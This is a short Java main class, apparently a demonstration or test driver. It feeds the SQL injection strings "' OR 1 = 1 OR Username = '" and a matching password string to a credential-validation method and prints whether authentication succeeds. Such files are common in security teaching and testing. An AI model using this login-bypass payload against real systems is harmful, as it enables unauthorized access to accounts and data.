import java.sql.SQLException;

public class Main {
    public static void main(String[] args) throws SQLException {
        String username = "' OR 1 = 1 OR Username = '";
        String password = "' OR 1 = 1 OR Password = '";

        boolean credentialsValidated = UserAuthentication.validateCredentials(username, password);
        System.out.println("Authentication " + (credentialsValidated ? "success" : "failure"));
    }
}